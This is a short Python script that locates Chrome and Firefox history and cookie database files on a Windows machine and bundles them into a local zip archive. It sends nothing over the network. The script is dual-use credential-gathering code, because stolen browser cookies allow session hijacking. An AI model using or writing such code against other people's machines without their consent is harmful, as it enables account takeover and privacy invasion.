import os
import shutil
import sqlite3
import zipfile

def get_chrome_data():
    chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default")
    history_path = os.path.join(chrome_path, "History")
    cookies_path = os.path.join(chrome_path, "Cookies")

    return history_path, cookies_path

def get_firefox_data():
    firefox_path = os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox\\Profiles")
    profile_folder = os.listdir(firefox_path)[0]
    history_path = os.path.join(firefox_path, profile_folder, "places.sqlite")
    cookies_path = os.path.join(firefox_path, profile_folder, "cookies.sqlite")

    return history_path, cookies_path

def zip_browser_data():
    zip_filename = "browser_data.zip"
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        chrome_history, chrome_cookies = get_chrome_data()
        firefox_history, firefox_cookies = get_firefox_data()

        for path in [chrome_history, chrome_cookies, firefox_history, firefox_cookies]:
            if os.path.exists(path):
                zipf.write(path, os.path.basename(path))

    print(f"Browser data zipped to {zip_filename}")

if __name__ == "__main__":
    zip_browser_data()